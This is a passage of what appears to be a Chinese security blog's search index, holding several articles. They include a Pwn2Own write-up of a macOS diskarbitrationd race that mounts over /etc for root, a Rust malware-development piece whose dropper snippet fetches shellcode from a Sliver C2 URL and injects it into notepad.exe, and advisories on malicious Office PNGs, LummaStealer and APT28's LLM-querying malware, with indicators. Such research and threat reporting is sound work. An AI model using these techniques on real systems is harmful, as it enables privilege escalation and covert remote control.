shell\r今天我们将介绍CVE-2017-2533/ZDI-17-357漏洞，这是macOS系统服务中的一个竞争条件漏洞，可用于从本地管理员权限提升至root权限。我们在今年的Pwn2Own比赛中结合其他逻辑漏洞利用它来逃逸Safari沙箱。\n该漏洞存在于Disk Arbitration守护进程(diskarbitrationd)中，该进程负责管理macOS上的块设备。其IPC接口可以从Safari沙箱内部访问，这使其成为我们感兴趣的目标。通过利用此漏洞，我们可以将磁盘分区挂载到任何不受SIP保护的目录上。由于每台新款MacBook都有一个允许默认用户写入的小型FAT32恢复分区，这使我们能够将任意内容的文件放入文件系统并获得root权限。\n漏洞发现\r在Safari渲染器中实现代码执行后，我们的目标是横向移动到更高权限的系统进程，因此我们通过查看允许的mach查找列表(即可以通过mach IPC通信的服务)开始审计。该列表可以在沙箱规则文件/System/Library/Frameworks/WebKit.framework/Versions/A/Resources/com.apple.WebProcess.sb中找到。\n列表中的第一个服务com.apple.DiskArbitration.diskarbitrationd立即引起了我们的注意。Disk Arbitration是Apple负责管理(主要是挂载和卸载)块设备的框架，diskarbitrationd是处理相应IPC请求的服务。为什么浏览器渲染器需要挂载磁盘？这绝对值得进一步调查。\n漏洞分析\r我们发现漏洞存在于DARequest.c文件的以下代码中：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 if ( DADiskGetDescription( disk, kDADiskDescriptionVolumePathKey ) == NULL ) { if ( DARequestGetUserUID( request ) ) { CFTypeRef mountpoint; mountpoint = DARequestGetArgument2( request ); // [...] if ( mountpoint ) { char * path; path = ___CFURLCopyFileSystemRepresentation( mountpoint ); if ( path ) { struct stat st; if ( stat( path, \u0026amp;st ) == 0 ) { if ( st.st_uid != DARequestGetUserUID( request ) ) { status = kDAReturnNotPermitted; } } 这里实现的机制本应防止具有挂载权限的用户挂载到他们不拥有的目录(如/etc或/System)。如果挂载点存在但不归用户所有，则会产生kDAReturnNotPermitted错误代码。这里存在一个典型的检查时间与使用时间(TOCTOU)问题：如果在检查之后但在挂载之前创建挂载点，即使调用者不拥有挂载点，挂载也可能成功。\n构建本地管理员到root的利用\r我们可以使用以下伪代码利用此漏洞将任何磁盘挂载到/etc：\n1 2 3 4 5 6 7 8 9 disk = \u0026#34;/dev/some-disk-device\u0026#34; in the background: while true: create symlink \u0026#34;/tmp/foo\u0026#34; pointing to \u0026#34;/\u0026#34; remove symlink while disk not mounted at \u0026#34;/etc\u0026#34;: send IPC request to diskarbitrationd to mount disk to \u0026#34;/tmp/foo/etc\u0026#34; 最终，检查将在符号链接不存在时执行，但挂载将在符号链接存在时发生，因此两者都会通过。此时我们已经挂载到了/etc，这对于本地管理员用户来说通常是不可能的。\n我们使用MacBook上的EFI分区(/dev/disk0s1)作为可写设备，并通过在/var/at/tabs/root中创建crontab文件来获得root权限执行任意命令。\n从Safari触发漏洞\r要在沙箱中触发此漏洞，我们需要：\n访问diskarbitrationd的IPC端点 - 已满足 对任意目录的写访问权限 - 已满足 获取挂载的授权令牌 - 不满足 创建符号链接的能力 - 不满足 在系列的下一部分中，我们将介绍另外三个漏洞，其中一个用于创建符号链接，另外两个用于绕过授权逻辑中的沙箱检查。\n","date":"2025-08-02T23:56:55+08:00","permalink":"http://localhost:1313/p/pwn2own-safari%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86%E8%8E%B7%E5%8F%96root-shell%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/","title":"Pwn2Own Safari沙箱逃逸第一部分：获取root shell的技术分析"},{"content":"基础网络交换机配置\r问题描述\r我是一名IT分析师，老板希望让我更多地接触网络相关的工作。他让我在办公室搭建一个实验环境。目前，我已经安装了一台HPE FlexNetwork 5130 EI交换机，并通过控制台端口和PuTTY串行连接成功接入设备。\n在CLI界面中，我已经完成了以下操作：\n设置交换机名称 为控制台端口设置密码 将用户角色设置为network-admin 配置时区并启用夏令时 设置NTP协议 但我不知道接下来该做什么。虽然我在边学边做，但搜索到的相关资料非常有限。\n下一步建议\r对于“基础交换机配置”，我认为接下来应该设置IP地址，但我想制定一个计划，让这个项目更有条理。\n可能的配置步骤\r配置管理IP地址：为交换机分配一个IP地址，以便通过SSH或Web界面远程管理。 设置VLAN：如果需要划分网络，可以配置VLAN。 配置端口：根据需求设置端口的速率、双工模式或启用/禁用端口。 保存配置：确保所有更改保存到启动配置中，避免重启后丢失。 如果你有更具体的需求或问题，可以进一步讨论！\n","date":"2025-08-02T23:40:15+08:00","permalink":"http://localhost:1313/p/hpe%E7%BD%91%E7%BB%9C%E4%BA%A4%E6%8D%A2%E6%9C%BA%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE%E6%8C%87%E5%8D%97/","title":"HPE网络交换机基础配置指南"},{"content":"代码简洁之道：软件基础现已免费\r2022年5月16日 | Max Kanat-Alexander\n一年前，一位Twitter用户在讨论中@我和其他编程书籍作者，描述了在他们国家获取编程书籍的障碍。我此前也隐约意识到这个问题——世界上许多国家的人们可能需要用一周的全部工资才能购买一本美元定价的书籍。\n我写书从来不是为了赚钱——而是为了传递理念和帮助他人。虽然通常认为付费能提高阅读率，但我的核心目标是让更多人读到这本书，因为这是改善软件行业的唯一途径。这本书至今仍有销量（对计算机类书籍而言很罕见，毕竟已出版十年），但盈利对我并不重要——重要的是传播知识。\n当我意识到全球有大量人群因经济原因无法合法阅读这本书时，便与O\u0026rsquo;Reilly编辑团队协商能否免费开放。由于亚马逊和O\u0026rsquo;Reilly商店存在不可控的复杂限制，最终解决方案是：出版社将发行权交还给我，允许去除封面后自由传播。\n现在，您可以免费下载《代码简洁之道：软件基础》了！希望这能让更多人学习软件设计的基本法则，共同推动软件开发领域进步。\n[分享按钮组]\n读者评论\rsergey\n2022年5月16日\n\u0026ldquo;现在这本顶尖编程书籍能免费获取真是太棒了，感谢！\u0026rdquo;\nMax Kanat-Alexander\n2022年6月7日\n\u0026ldquo;谢谢sergey！很高兴能以这种方式帮助大家🙂\u0026rdquo;\nSTEVEN GORDON\n2022年5月17日\n\u0026ldquo;书中将测试视为事后补充，暴露了您对软件开发的认知缺陷。自动化测试应该优先进行，它才是表达代码意图的关键（而非随时间失效的注释），也是安全重构和维护的基础。\u0026rdquo;\nMax Kanat-Alexander\n2022年6月7日\n\u0026ldquo;Steven，您可能误解了书中关于测试的论述。我的测试哲学可参考：https://www.codesimplicity.com/post/the-philosophy-of-testing/\u0026rdquo;\nYubraj Lama\n2022年6月20日\n\u0026ldquo;书中阐述的软件设计基础法则非常精彩，感谢Max。\u0026rdquo;\n","date":"2025-08-02T23:24:13+08:00","permalink":"http://localhost:1313/p/%E4%BB%A3%E7%A0%81%E7%AE%80%E6%B4%81%E4%B9%8B%E9%81%93%E8%BD%AF%E4%BB%B6%E5%9F%BA%E7%A1%80%E7%8E%B0%E5%B7%B2%E5%85%8D%E8%B4%B9%E5%BC%80%E6%94%BE/","title":"《代码简洁之道：软件基础》现已免费开放"},{"content":"MS13-051：Get Out of My Office!\rMS13-051修复了Microsoft Office 2003和Office for Mac中的一个安全漏洞。较新版本的Windows版Office不受此漏洞影响，但Mac版Office 2011仍受影响。我们已发现该漏洞在野外的针对性0day攻击中被利用。\n技术细节\r在Office的PNG文件解析代码中，存在对块长度字段检查不严的漏洞。根据PNG规范(http://www.w3.org/TR/PNG/#5Chunk-layout)，\u0026ldquo;虽然编码器和解码器应将长度视为无符号数，但其值不应超过2^31-1字节\u0026rdquo;。然而在恶意PNG文件中，我们发现块长度字段被设置为0xFFFFFFFF。PNG解析代码虽然正确将该字段视为无符号数，但未检查该值是否超过2^31-1的限制。\nShellcode分析显示该漏洞利用是典型的基于栈的缓冲区溢出，攻击者通过向栈上缓冲区写入超量数据，最终劫持程序执行流。旧版Office/Windows缺乏针对此类攻击的缓解措施，而新版则具备防护能力。我们也验证了EMET 3.0及以上版本能有效阻止已观察到的攻击。\n攻击模式\r观察到的攻击具有高度针对性，攻击者刻意规避安全研究人员调查。恶意样本是Office 2003二进制格式文档，其中不直接包含恶意PNG文件，而是通过引用远程服务器上的PNG文件实现攻击。\n攻击者还在服务器上部署了脚本，避免多次提供PNG漏洞利用文件，以保持0day的隐蔽性。已观察到的攻击主要分布在印度尼西亚和马来西亚地区。\n检测建议\r所有恶意文档的共同特征是使用\u0026quot;space.gif\u0026quot;文件名获取远程PNG漏洞文件。为帮助安全厂商和企业检测潜在威胁，我们提供部分用于加载远程PNG漏洞的URL和恶意Office文档哈希值：\n恶意URL示例:\n1 2 3 hXXp://intent.nofrillspace.com/users/web11_focus/4307/space.gif hXXp://intent.nofrillspace.com/users/web11_focus/3807/space.gif hXXp://mister.nofrillspace.com/users/web8_dice/3791/space.gif 文档哈希值:\nMD5 SHA1 fde37e60cc4be73dada0fb1ad3d5f273 1bdc1a0bc995c1beb363b11b71c14324be8577c9 2f1ab543b38a7ad61d5dbd72eb0524c4 2a33542038a85db4911d7b846573f6b251e16b2d 感谢Google公司的Andrew Lyons和Neel Mehta的报告，以及Elia Florio和Cristian Craioveanu对本案例的帮助。\nNeil Sikka, MSRC Engineering @neilsikka ","date":"2025-08-02T23:13:07+08:00","permalink":"http://localhost:1313/p/ms13-051%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90office-png%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E4%B8%8E%E6%94%BB%E5%87%BB%E6%A8%A1%E5%BC%8F/","title":"MS13-051漏洞分析：Office PNG解析漏洞的技术细节与攻击模式"},{"content":"人工智能与办公软件融合：最佳集成案例\r随着人工智能技术深度渗透生活各领域，越来越多的软件开发者和IT企业正寻求将尖端AI技术集成到产品中。现代办公软件领域已涌现多个成功案例：\nMicrosoft 365 Copilot：基于大语言模型(LLM)，深度集成Word/Excel/PowerPoint工作流 WPS AI：提供文档摘要、数据分析和会议纪要生成等功能 Google Workspace Gemini：支持文档创作、表格公式生成和幻灯片设计 Zoho Zia：专注于语法检查和内容优化 ONLYOFFICE的AI集成方案\r作为开源办公套件，ONLYOFFICE Docs通过插件机制实现了AI能力集成：\n支持文本/表格/幻灯片全格式处理 提供本地部署和云版本 开源代码托管于GitHub 通过Plugin Manager管理插件 ChatGPT插件技术架构\r插件包含5个核心目录：\n1. HTML结构层\rindex.html：主入口文件，加载所有JS/CSS资源 chat.html：聊天框UI结构定义 错误处理HTML文件 2. 资源目录\rlight/和dark/：适配不同主题的图片资源 icons/：多分辨率图标集 CSS样式表 3. 核心脚本\rcode.js实现主要功能：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 function checkApiKey() { ApiKey = localStorage.getItem(\u0026#39;OpenAIApiKey\u0026#39;) || \u0026#39;\u0026#39;; bHasKey = !!ApiKey.length; } function getContextMenuItems(options) { return { guid: window.Asc.plugin.guid, items: [{ id: \u0026#39;ChatGPT\u0026#39;, text: generateText(\u0026#39;ChatGPT\u0026#39;), items: [] }] }; } 4. 多语言支持\rtranslations/目录包含各语言JSON文件，通过onTranslate()方法实现动态本地化\n5. 第三方依赖\rvendor/目录包含：\nOpenAI编码器 Select2 UI库 jQuery基础文件 功能实现细节\rAPI密钥验证：通过settings.js实现密钥校验 上下文菜单：动态生成AI功能选项 聊天交互：chat.js处理对话逻辑 错误处理：专用JS文件管理异常场景 1 2 3 4 5 6 7 // 消息创建逻辑 function createMessage(text, type) { let chat = document.getElementById(\u0026#39;chat\u0026#39;); let message = type ? document.createElement(\u0026#39;div\u0026#39;) : document.getElementById(\u0026#39;loading\u0026#39;); // ...消息渲染逻辑 } 该技术方案展示了如何通过标准API将AI能力嵌入办公软件，开发者可参照此模式集成其他AI服务。完整代码已开源在GitHub仓库。\n","date":"2025-08-02T22:56:44+08:00","permalink":"http://localhost:1313/p/%E5%BC%80%E6%BA%90%E5%8A%9E%E5%85%AC%E5%A5%97%E4%BB%B6onlyoffice%E5%A6%82%E4%BD%95%E9%9B%86%E6%88%90ai%E6%8A%80%E6%9C%AFchatgpt%E6%8F%92%E4%BB%B6%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/","title":"开源办公套件ONLYOFFICE如何集成AI技术：ChatGPT插件深度解析"},{"content":"如何使用JavaScript创建安全的随机密码\r最近我在编写JavaScript代码时需要生成随机密码，但惊讶地发现很难找到正确的实现方法。Google、StackOverflow甚至ChatGPT提供的大多数方案都存在各种缺陷。\n常见错误方案分析\r错误示例1：使用Math.random()\r1 2 3 4 5 6 7 8 /* 弱随机数生成器示例，切勿使用 */ var chars = \u0026#34;0123456789abcdefghijklmnopqrstuvwxyz!@#$%^\u0026amp;*()ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#34;; var passwordLength = 12; var password = \u0026#34;\u0026#34;; for (var i = 0; i \u0026lt;= passwordLength; i++) { var randomNumber = Math.floor(Math.random() * chars.length); password += chars.substring(randomNumber, randomNumber +1); } MDN文档明确指出：Math.random()不提供密码学安全的随机数，任何安全相关场景都应使用Web Crypto API的window.crypto.getRandomValues()方法。\n错误示例2：浮点数转换偏差\r1 2 3 4 5 6 7 8 9 10 11 12 13 /* 存在浮点数舍入偏差的示例，切勿使用 */ function generatePassword(length = 16) { let generatedPassword = \u0026#34;\u0026#34;; const validChars = \u0026#34;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,.-{}+!\\\u0026#34;#$%/()=?\u0026#34;; for (let i = 0; i \u0026lt; length; i++) { let randomNumber = crypto.getRandomValues(new Uint32Array(1))[0]; randomNumber = randomNumber / 0x100000000; randomNumber = Math.floor(randomNumber * validChars.length); generatedPassword += validChars[randomNumber]; } return generatedPassword; } 此方案虽然使用了安全的crypto.getRandomValues()，但通过浮点数转换会引入不均匀分布问题。\n错误示例3：模偏差问题\r1 2 3 4 5 6 7 8 /* 存在模偏差的示例，切勿使用 */ var generatePassword = ( length = 20, characters = \u0026#39;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz~!@-#$\u0026#39; ) =\u0026gt; Array.from(crypto.getRandomValues(new Uint32Array(length))) .map((x) =\u0026gt; characters[x % characters.length]) .join(\u0026#39;\u0026#39;) 当随机数范围不是字符集大小的整数倍时，会导致某些字符出现概率更高。\n正确实现方案\r拒绝采样技术\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 function simplesecpw() { const pwlen = 15; const pwchars = \u0026#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\u0026#34;; const limit = 256 - (256 % pwchars.length); let passwd = \u0026#34;\u0026#34;; let randval; for (let i = 0; i \u0026lt; pwlen; i++) { do { randval = window.crypto.getRandomValues(new Uint8Array(1))[0]; } while (randval \u0026gt;= limit); passwd += pwchars[randval % pwchars.length]; } return passwd; } 该方案实现了三个关键安全要素：\n使用密码学安全的crypto.getRandomValues() 避免浮点数运算 通过拒绝采样消除模偏差 技术原理详解\r密码学安全随机数：现代操作系统都内置了密码学安全随机数生成器，浏览器通过Web Crypto API暴露该功能。\n模偏差问题：当随机数范围(256)不是字符集大小(62)的整数倍时，直接取模会导致某些字符出现概率更高。例如：\n小写字母\u0026quot;a\u0026quot;对应5个值(0,62,124,186,248) 大写字母\u0026quot;A\u0026quot;只对应4个值(26,88,150,212) 拒绝采样：通过丢弃会导致偏差的随机值(≥limit)，确保剩余值能均匀分布。虽然理论上可能导致延迟，但实际影响可忽略不计。\n实际应用\r本文提供的代码已发布在0BSD许可下，包含：\n基础版：固定15字符长度，包含字母和数字 可配置版：支持自定义长度和字符集 在线演示地址：https://password.hboeck.de/ GitHub仓库：包含完整实现代码\n","date":"2025-08-02T22:45:17+08:00","permalink":"http://localhost:1313/p/%E4%BD%BF%E7%94%A8javascript%E7%94%9F%E6%88%90%E5%AE%89%E5%85%A8%E9%9A%8F%E6%9C%BA%E5%AF%86%E7%A0%81%E7%9A%84%E7%BB%88%E6%9E%81%E6%8C%87%E5%8D%97/","title":"使用JavaScript生成安全随机密码的终极指南"},{"content":"技术分析\r攻击链概述\r趋势科技威胁狩猎团队发现新型攻击活动，攻击者创建AI生成的虚假GitHub仓库，伪装成以下类型项目：\n游戏外挂程序 软件破解工具 加密货币工具 lua51.dll - LuaJIT运行时解释器 luajit.exe - Lua加载器可执行文件 userdata.txt - 恶意Lua脚本（经混淆处理） Launcher.bat - 执行批处理脚本 技术演进对比\r特征 2024年10月旧活动 2025年新活动 托管方式 GitHub文件附件 GitHub Releases板块 诱导手段 仿冒下载页面 AI生成仓库文档 载荷传递 直接下载 多阶段Lua脚本执行链 载荷执行流程\r受害者执行Launcher.bat触发luajit.exe 加载器从GitHub获取加密文件（l.txt/lmd.txt） 重命名为search.exe/debug.lua后执行 通过AutoIT脚本释放LummaStealer 连接C2服务器（pasteflawwed[.]world） 窃取数据类型\r浏览器凭证与Cookie 加密货币钱包文件 2FA扩展数据（如Authenticator） 系统敏感信息（PII） 防御建议\r企业防护措施\r1 2 3 4 5 6 7 8 9 10 11 12 1. 终端防护： - 部署具备行为检测的EDR解决方案 - 启用应用程序控制策略（阻止非授权脚本） 2. 网络防护： - 阻断已知恶意GitHub域名 - 监控异常9222端口调试流量 3. 威胁狩猎： ```hunting_query eventSubId:301 AND processFilePath:Research.com AND hostName:pasteflawded.world 1 2 3 4 5 6 7 8 9 10 11 12 ### 个人防护要点 - 验证仓库真实性（检查commit历史/贡献者） - 使用沙箱环境检测可疑文件 - 避免下载\u0026#34;灰色\u0026#34;软件（破解/外挂工具） ## 威胁指标(IoC) - C2域名：pasteflawded[.]world - 文件哈希：详见趋势科技官方IoC列表 - AutoIT载荷路径：`%TEMP%\\Research.com` \u0026gt; 该活动显示攻击者正将AI技术与传统代码混淆（Lua/Prometheus混淆器）相结合，滥用开发平台信誉实施供应链攻击。建议结合威胁情报进行主动防御。 ","date":"2025-08-02T22:33:52+08:00","permalink":"http://localhost:1313/p/ai%E7%94%9F%E6%88%90%E8%99%9A%E5%81%87github%E4%BB%93%E5%BA%93%E4%BC%A0%E6%92%ADsmartloader%E5%92%8Clummastealer%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/","title":"AI生成虚假GitHub仓库传播SmartLoader和LummaStealer恶意软件"},{"content":"本博客是《Anatomy of a Security Update》的日文翻译版。最新信息请参考原文。\n微软安全响应中心作为防御社区的一部分，始终站在客户与公司安全响应的最前线。我们的使命是保护客户和微软免受当前及未来新型安全与隐私威胁。通过持续监控威胁态势，为组织提供防御、识别和修复攻击的最新工具与指南。\n我们经常被问到：\n为什么微软不能更快发布安全更新？ 为什么发现零日漏洞后不能立即发布补丁？ 为什么要依赖协调漏洞披露？ 这些都是很好的问题。 安全更新的生命周期\r\u0026ldquo;安全更新的开发需要在质量与时效性之间取得微妙平衡。我们必须考虑如何最小化客户干扰，同时最大化保护效果。\u0026rdquo; ——微软安全响应中心副总裁 Aanchal Gupta\n每个漏洞都具有独特性，需要解决特定的技术挑战。从问题发现到安全更新发布的时间长度受多重因素影响。我们必须考虑更新发布后对客户环境的实际影响，这包括：\n跨产品服务的多样化客户环境 存在漏洞的受支持平台数量 更新开发遵循严格流程：\n取证调查：漏洞发现后立即启动，分析研究者报告内容并与代码库进行映射 变种分析：搜索并研究该漏洞的变种，确保全面修复 跨服务影响评估：检查漏洞对微软全线服务的影响 合作伙伴协同： 通过MAPP计划向安全合作伙伴提供检测指南 通过SUVP程序与外部合作伙伴进行实际测试 质量验证：更新需通过严格测试确保无副作用 发布决策：满足质量标准后纳入\u0026quot;补丁星期二\u0026quot;或进行带外发布 同时会准备CVE文档，包含：\n漏洞指南 常见问题解答 现有缓解措施 更新链接 发布说明 这些信息均发布于《安全更新指南》。\n什么是零日漏洞？\r零日漏洞指尚未发布官方补丁的软件缺陷。软件供应商可能知晓或不知晓该漏洞。这类漏洞通常具有高严重性，可能被积极利用。\n但并非所有零日漏洞都会导致攻击。攻击复杂度、安装基数可用性和利用可靠性都是攻击者考虑的因素。\n协调漏洞披露(CVD)\r我们坚信CVD是缓解零日漏洞风险的最佳实践。其核心目标是：\n为客户提供及时一致的防护指南 通过研究者协作限制攻击者机会窗口 微软要求研究者直接向我们报告新发现漏洞，在公开前给予我们诊断和修复的机会。符合奖励计划范围的漏洞研究者将获得奖金和公开致谢。\n当攻击广泛进行而微软尚未完成补丁时，我们将与研究者紧密协作提前披露漏洞。\n客户最佳实践\r建议客户保持系统处于最新状态： \u0026ldquo;您的技术基础设施和安防系统就像\u0026rsquo;免疫系统\u0026rsquo;。即使没有零日更新，保持系统更新也能增强整体防护能力。\u0026rdquo; ——Aanchal Gupta\n攻击者常组合使用：\n零日漏洞 已修复但未更新的旧漏洞 社会工程攻击 关键防护措施：\n定期更新：遵循\u0026quot;补丁星期二\u0026quot;节奏 利用安全工具： Microsoft 365 Defender的威胁与漏洞管理功能 安全更新指南中的CVSS评分和可利用性指数 安全意识： 仅从官方商店下载软件 验证可疑附件和链接 启用多因素认证 对于IT管理员：\n使用安全更新指南规划部署 通过威胁分析报告获取攻击上下文 优先处理高可利用性漏洞 ","date":"2025-08-02T22:22:33+08:00","permalink":"http://localhost:1313/p/%E5%AE%89%E5%85%A8%E6%9B%B4%E6%96%B0%E7%A8%8B%E5%BA%8F%E5%89%96%E6%9E%90%E5%BE%AE%E8%BD%AF%E5%AE%89%E5%85%A8%E5%93%8D%E5%BA%94%E4%B8%AD%E5%BF%83%E7%9A%84%E5%86%85%E9%83%A8%E6%B5%81%E7%A8%8B%E8%A7%A3%E6%9E%90/","title":"安全更新程序剖析：微软安全响应中心的内部流程解析"},{"content":"AWS远程访问指南：混合办公环境的安全技术方案\rAmazon Web Services（AWS）客户可通过安全远程访问云资源，在保障业务敏捷性的同时满足灵活办公需求。随着混合办公模式普及，AWS提供完整的安全解决方案，帮助企业在允许远程访问的前提下维护资源保护、访问控制及合规要求。\n关键技术用例\r本文重点解决以下场景：\n用户访问VPC内部署的Web应用 运维人员访问VPC内的EC2/RDS实例 分析师访问Amazon S3敏感数据 用户访问SAML 2.0/OAuth 2.0应用 远程访问核心挑战\r成本控制：解决方案的经济性评估 暴露面扩大：需保护身份、设备及通信链路 社会工程风险：人为因素成为安全薄弱环节 用户体验：不良UX设计可能引发操作风险 五大技术方案详解\r1. 网络层方案（Network-based）\r核心服务：AWS Client VPN\n基于OpenVPN客户端实现VPC安全接入 支持企业IDP联合证书双重认证 通过CIDR授权规则实现网络级访问控制 典型架构：用户设备 → Client VPN → VPC端点 → 目标资源 2. 主机层方案（Host-based）\r关键技术对比：\n服务 协议 认证方式 可见性 成本模型 Systems Manager SSH/RDP IAM策略 CloudTrail全日志 免费（EC2场景） EC2 Instance Connect 原生SSH 短期密钥 连接级审计 无附加费用 3. 终端用户计算（EUC）\r服务选型：\nAmazon WorkSpaces：持久化云桌面（WSP/PCoIP协议） AppStream 2.0：按需应用流式传输（NICE DCV协议） 安全优势：数据永不离开VPC，仅传输加密像素流 4. 应用层方案（Application-based）\rIAM Identity Center核心能力：\n统一管理SAML 2.0/OAuth 2.0应用访问 内置支持Amazon QuickSight等AWS托管应用 与企业AD/SAML IDP无缝集成 5. 零信任模型\rAWS Verified Access关键技术：\n基于Cedar策略的细粒度授权 集成设备信号增强决策上下文 每个请求的完整日志记录（HTTP/TCP层） 技术选型决策矩阵\r解决方案 信任边界 协议支持 授权粒度 成本因素 Client VPN 网络子网 IP层 CIDR块级 连接时长×终端数 Verified Access 应用实例 HTTP(S)/TCP 属性基策略 应用数×带宽消耗 WorkSpaces 虚拟桌面 WSP 组成员关系 实例类型×运行时长 实施建议\r资产分类：明确需访问的资源关键等级 可见性设计：确保满足合规审计要求 混合部署：不同场景组合使用多方案（如内部员工用Session Manager，外包人员用AppStream 2.0） 参考架构：遵循AWS安全参考架构设计部署模型 ","date":"2025-08-02T22:00:53+08:00","permalink":"http://localhost:1313/p/aws%E8%BF%9C%E7%A8%8B%E8%AE%BF%E9%97%AE%E6%8C%87%E5%8D%97%E6%B7%B7%E5%90%88%E5%8A%9E%E5%85%AC%E7%8E%AF%E5%A2%83%E7%9A%84%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88/","title":"AWS远程访问指南：混合办公环境的安全技术方案"},{"content":"Rust在恶意软件开发中的应用\r引言\r作者分享了学习Rust进行恶意软件开发的经历，旨在提升模拟真实攻击的能力。Rust因其固有的反分析特性成为首选语言，能开发更具隐蔽性的工具。\nRust与C语言的对比分析\r近年来，Go、Nim和Rust等语言在恶意软件作者中日益流行，主要基于两个假设：\n这些语言编译的二进制文件比C/C++更难逆向分析 非常规语言开发的恶意软件更容易绕过基于签名的检测机制 2023年罗切斯特理工学院的一项研究证实：\nRust二进制文件显著大于C/C++版本 自动化分析工具对Rust程序产生更多误报和漏报 Ghidra和IDA Free等工具对Rust二进制文件的反编译效果较差 实例分析：Shellcode加载器\r通过功能相同的Rust和C版shellcode加载器进行对比：\n1 2 3 4 5 6 7 8 9 10 use std::fs::File; use std::ptr; use std::io::{self, Read}; use windows::Win32::{ System::{ Threading::{CreateThread, WaitForSingleObject, THREAD_CREATION_FLAGS, INFINITE}, Memory::{VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS}, }, Foundation::CloseHandle }; 编译后，Rust程序(151.5KB)几乎是C程序(71.7KB)的两倍，这是因为Rust默认静态链接依赖项。\nGhidra逆向分析对比\rRust程序的反编译输出难以理解，原因包括：\nGhidra尝试将Rust反编译为伪C代码，但内存管理和优化差异导致难以理解 rustc的编译优化导致函数边界模糊，汇编代码高度优化 相比之下，C程序的反编译输出与源代码高度一致。\n开发Rust恶意软件投放器\r构建一个投放器演示，功能包括：\n枚举目标进程以注入payload 使用文件映射注入技术执行payload 通过HTTPS部署Sliver C2框架 关键代码模块：\n1 2 3 4 5 6 7 8 9 mod enumerate_processes; mod remote_mapping_injection; mod http_client; fn main() { let url = String::from(\u0026#34;https://sliver.nrcerne.com:8444/DULL_EQUIPMENT\u0026#34;); let shellcode = http_client::get_payload_bytes(url).unwrap(); // 注入notepad.exe进程 } 操作安全考虑\rRust会在二进制文件中包含绝对路径(用于调试)，因此需在匿名环境中编译以保护操作安全。\n结论\rRust是C/C++开发恶意软件的优秀替代方案。虽然Ghidra 11.0在反编译Rust二进制文件方面取得进步，但由于函数内联和编译优化，分析Rust程序仍然困难。更大的二进制文件也增加了分析时间成本。\n完整代码示例可在GitHub获取\n","date":"2025-08-02T21:49:26+08:00","permalink":"http://localhost:1313/p/rust%E5%9C%A8%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E4%B8%AD%E7%9A%84%E4%BC%98%E5%8A%BF%E4%B8%8E%E5%AE%9E%E8%B7%B5/","title":"Rust在恶意软件开发中的优势与实践"},{"content":"俄罗斯网络间谍组织APT28已开发出通过查询大型语言模型(LLM)生成命令的恶意软件。该恶意软件被乌克兰CERT命名为LAMEHUG，近期被用于针对乌克兰政府实体的鱼叉式钓鱼攻击，成为攻击者利用AI实施攻击的新案例。\n根据CERT-UA报告，钓鱼邮件来自被入侵的邮箱账户，冒充乌克兰某部委代表。恶意软件包含在ZIP压缩包中，使用.pif(MS-DOS可执行文件)扩展名，但也观察到.exe和.py扩展名的变体。\nCERT-UA将这些攻击归因于其追踪为UAC-0001的组织，该组织在安全社区更广为人知的名称是APT28。西方情报机构已正式将该组织与俄罗斯军事情报局GRU的第26165部队(或称第85主要特别服务中心)联系起来。\nAPT28(又称Sofacy、Pawn Storm或Fancy Bear)自2004年起就对西方国家目标开展网络行动，在2022年2月俄罗斯入侵乌克兰之前就已在乌频繁活动。去年美国司法部起诉了五名GRU军官和一名涉嫌协助的平民，指控其对乌克兰计算机基础设施实施破坏性网络攻击，并探测包括美国在内的26个北约成员国政府计算机系统。鉴于APT28的全球行动范围，新型LAMEHUG恶意软件很可能不久就会被用于西方目标。\n实时查询LLM API的创新手法 此前观察到的攻击者主要使用LLM编写恶意脚本或优化钓鱼邮件内容，网络犯罪论坛上也出售各种未经审查和越狱的LLM订阅服务。但LAMEHUG开发者采取了不同方法，将直接查询LLM的功能内置到恶意程序本身。\nLAMEHUG通过Hugging Face平台(网络最大的LLM和其他AI资产托管平台)的API，向Qwen 2.5-Coder-32B-Instruct模型发送查询指令，要求模型模拟Windows系统管理员生成命令列表：创建文件夹、收集计算机/网络/Active Directory域信息并存入文本文件。另一个独立查询则要求模型生成递归复制Documents、Downloads和Desktop文件夹中所有.pdf和.txt文档到新建的C:\\Programdata\\info\\目录下的命令。\n技术实现细节 LAMEHUG采用Python编写，通过PyInstaller将源代码编译为可执行二进制文件。CERT-UA观察到其分发形态包括Appendix.pif、AI_generator_uncensored_Canvas_PRO_v0.9.exe、AI_image_generator_v0.95.exe和image.py等变体，各版本在数据渗出方式上存在功能差异。恶意软件的C2服务器托管在合法但已被入侵的基础设施上。\n正如LLM正成为组织和员工的常用工具，它们对攻击者也同样有用。研究人员近期测试LLM执行漏洞开发和利用任务的能力，发现虽然目前效果不佳但进步迅速。随着时间推移，我们很可能会看到更多AI辅助攻击，甚至高级黑客行为，就像AI辅助编程的兴起一样。通过动态使用LLM生成多样化命令，攻击者可能希望借此引入多态性特征来规避检测签名。\n","date":"2025-08-02T21:38:11+08:00","permalink":"http://localhost:1313/p/%E4%BF%84%E7%BD%97%E6%96%AFapt28%E6%96%B0%E5%9E%8B%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%88%A9%E7%94%A8llm%E7%94%9F%E6%88%90%E6%81%B6%E6%84%8Fwin